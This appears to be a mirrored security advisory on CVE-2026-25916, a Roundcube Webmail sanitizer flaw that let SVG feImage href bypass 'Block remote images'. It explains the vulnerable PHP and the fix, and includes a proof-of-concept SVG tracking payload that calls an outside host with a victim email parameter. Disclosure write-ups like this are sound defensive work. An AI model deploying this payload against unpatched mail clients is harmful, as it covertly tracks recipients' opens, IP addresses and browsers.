<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/">Original</a>
    <h1>Roundcube Webmail: SVG feImage bypasses image blocking to track email opens</h1>
    
    <div id="readability-page-1" class="page"><div><p>Roundcube&#39;s HTML sanitizer doesn&#39;t treat SVG feImage href as an image source. Attackers can bypass remote image blocking to track email opens. (CVE-2026-25916)</p></div><div itemprop="articleBody"><p><strong>TL;DR:</strong> Roundcube’s <code>rcube_washtml</code> sanitizer blocked external resources on <code>&lt;img&gt;</code>, <code>&lt;image&gt;</code>, and <code>&lt;use&gt;</code>, but not on <code>&lt;feImage&gt;</code>. Its <code>href</code> went through the wrong code path and got allowed through. Attackers could track email opens even when “Block remote images” was on. Fixed in 1.5.13 and 1.6.13.</p><h2 id="vulnerability-information">Vulnerability information<a href="#vulnerability-information" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Vendor</strong></td><td>Roundcube</td></tr><tr><td><strong>Product</strong></td><td>Roundcube Webmail</td></tr><tr><td><strong>Affected versions</strong></td><td>&lt; 1.5.13, 1.6.x &lt; 1.6.13</td></tr><tr><td><strong>CVE</strong></td><td>CVE-2026-25916</td></tr><tr><td><strong>Disclosure date</strong></td><td>2026-02-08</td></tr></tbody></table><h2 id="background">Background<a href="#background" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><p>When <code>allow_remote</code> is false, Roundcube’s sanitizer intercepts image-bearing attributes (<code>src</code> on <code>&lt;img&gt;</code>, <code>href</code> on <code>&lt;image&gt;</code> and <code>&lt;use&gt;</code>) and runs them through <code>is_image_attribute()</code>. That function blocks external URLs.</p><p>Separately, non-image URLs (like <code>&lt;a href&gt;</code>) go through <code>wash_link()</code>, which lets HTTP/HTTPS URLs through. That’s fine for links the user clicks on intentionally.</p><h2 id="discovery">Discovery<a href="#discovery" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><p>I got bored during my christmas vacation and <a href="https://roundcube.net/news/2025/12/13/security-updates-1.6.12-and-1.5.12">this SVG-based XSS fix via the <code>animate</code> tag</a> appeared on my radar. One SVG bug usually means more.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> So I spent some time going through <code>rcube_washtml.php</code>, looking at which SVG elements made it onto the allowlist and how their attributes get handled and sanitized.</p><p><code>&lt;feImage&gt;</code> stood out.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> Its <code>href</code> gets fetched on render, same as <code>&lt;img src&gt;</code>. But the sanitizer sends it through <code>wash_link()</code> instead of <code>is_image_attribute()</code>.</p><p>So the “Block remote images” setting doesn’t apply to it.</p><h2 id="technical-details">Technical details<a href="#technical-details" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><p>In <code>wash_attribs()</code>, every attribute hits a chain of checks. The first one that matches wins:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L310-L313">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>if</span> <span>(</span><span>$this</span><span>-&gt;</span><span>is_image_attribute</span><span>(</span><span>$node</span><span>-&gt;</span><span>nodeName</span><span>,</span> <span>$key</span><span>))</span> <span>{</span>
</span></span><span><span>    <span>$out</span> <span>=</span> <span>$this</span><span>-&gt;</span><span>wash_uri</span><span>(</span><span>$value</span><span>,</span> <span>true</span><span>);</span>  <span>// blocks remote URLs
</span></span></span><span><span><span>}</span> <span>elseif</span> <span>(</span><span>$this</span><span>-&gt;</span><span>is_link_attribute</span><span>(</span><span>$node</span><span>-&gt;</span><span>nodeName</span><span>,</span> <span>$key</span><span>))</span> <span>{</span>
</span></span><span><span>    <span>$out</span> <span>=</span> <span>$this</span><span>-&gt;</span><span>wash_link</span><span>(</span><span>$value</span><span>);</span>        <span>// allows http/https
</span></span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Before the fix, <code>is_image_attribute()</code> looked like this:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L472-L481">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>private</span> <span>function</span> <span>is_image_attribute</span><span>(</span><span>$tag</span><span>,</span> <span>$attr</span><span>)</span>
</span></span><span><span><span>{</span>
</span></span><span><span>    <span>return</span> <span>$attr</span> <span>==</span> <span>&#39;background&#39;</span>
</span></span><span><span>        <span>||</span> <span>$attr</span> <span>==</span> <span>&#39;color-profile&#39;</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>&#39;poster&#39;</span> <span>&amp;&amp;</span> <span>$tag</span> <span>==</span> <span>&#39;video&#39;</span><span>)</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>&#39;src&#39;</span> <span>&amp;&amp;</span> <span>preg_match</span><span>(</span><span>&#39;/^(img|image|source|input|video|audio)$/i&#39;</span><span>,</span> <span>$tag</span><span>))</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$tag</span> <span>==</span> <span>&#39;use&#39;</span> <span>&amp;&amp;</span> <span>$attr</span> <span>==</span> <span>&#39;href&#39;</span><span>)</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$tag</span> <span>==</span> <span>&#39;image&#39;</span> <span>&amp;&amp;</span> <span>$attr</span> <span>==</span> <span>&#39;href&#39;</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>The <code>href</code> attribute is only matched for <code>use</code> and <code>image</code>. No <code>feimage</code>.</p><p>And <code>is_link_attribute()</code> is a catch-all<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L459-L462">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>private</span> <span>function</span> <span>is_link_attribute</span><span>(</span><span>$tag</span><span>,</span> <span>$attr</span><span>)</span>
</span></span><span><span><span>{</span>
</span></span><span><span>    <span>return</span> <span>$attr</span> <span>===</span> <span>&#39;href&#39;</span><span>;</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>So when the sanitizer encounters <code>&lt;feImage href=&#34;https://...&#34;&gt;</code>: <code>is_image_attribute(&#39;feimage&#39;, &#39;href&#39;)</code> returns false, <code>is_link_attribute(&#39;feimage&#39;, &#39;href&#39;)</code> returns true, and the URL goes through <code>wash_link()</code> which passes HTTP/HTTPS URLs straight through.</p><h2 id="proof-of-concept">Proof of concept<a href="#proof-of-concept" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><p>An invisible 1x1 SVG, positioned off-screen:</p><div><pre tabindex="0"><code data-lang="html"><span><span><span>&lt;</span><span>svg</span> <span>width</span><span>=</span><span>&#34;1&#34;</span> <span>height</span><span>=</span><span>&#34;1&#34;</span> <span>style</span><span>=</span><span>&#34;position:absolute;left:-9999px;&#34;</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;</span><span>defs</span><span>&gt;</span>
</span></span><span><span>    <span>&lt;</span><span>filter</span> <span>id</span><span>=</span><span>&#34;t&#34;</span><span>&gt;</span>
</span></span><span><span>      <span>&lt;</span><span>feImage</span> <span>href</span><span>=</span><span>&#34;https://httpbin.org/image/svg?email=victim@test.com&#34;</span>
</span></span><span><span>               <span>width</span><span>=</span><span>&#34;1&#34;</span> <span>height</span><span>=</span><span>&#34;1&#34;</span><span>/&gt;</span>
</span></span><span><span>    <span>&lt;/</span><span>filter</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;/</span><span>defs</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;</span><span>rect</span> <span>filter</span><span>=</span><span>&#34;url(#t)&#34;</span> <span>width</span><span>=</span><span>&#34;1&#34;</span> <span>height</span><span>=</span><span>&#34;1&#34;</span><span>/&gt;</span>
</span></span><span><span><span>&lt;/</span><span>svg</span><span>&gt;</span>
</span></span></code></pre></div><p>The browser evaluates the SVG filter and fires a GET to the attacker’s URL.</p><h2 id="impact">Impact<a href="#impact" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><p>The “Block remote images” setting doesn’t block this remote image. An attacker can confirm you opened it, log your IP, and fingerprint your browser.</p><p>The fix (<a href="https://github.com/roundcube/roundcubemail/commit/26d7677"><code>26d7677</code></a>) collapses the two separate <code>use</code>/<code>image</code> checks into a single regex that includes <code>feimage</code>:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/26d7677471b68ff2d02ebe697cb606790b0cf52f/program/lib/Roundcube/rcube_washtml.php#L478">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>&#39;href&#39;</span> <span>&amp;&amp;</span> <span>preg_match</span><span>(</span><span>&#39;/^(feimage|image|use)$/i&#39;</span><span>,</span> <span>$tag</span><span>));</span> <span>// SVG
</span></span></span></code></pre></div><p>Now <code>&lt;feImage href&gt;</code> hits <code>is_image_attribute()</code> first, gets routed through <code>wash_uri()</code>, and the remote URL is blocked.</p><p>Update to 1.5.13 or 1.6.13.</p><h2 id="timeline">Timeline<a href="#timeline" aria-label="Link to this section"><span aria-hidden="true">#</span></a></h2><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2026-01-04</td><td>Reported to Roundcube</td></tr><tr><td>2026-02-08</td><td>1.5.13 and 1.6.13 released</td></tr><tr><td>2026-02-08</td><td>This post</td></tr><tr><td>2026-02-09</td><td>CVE-2026-25916 assigned</td></tr></tbody></table></div></div>
  </body>
</html>
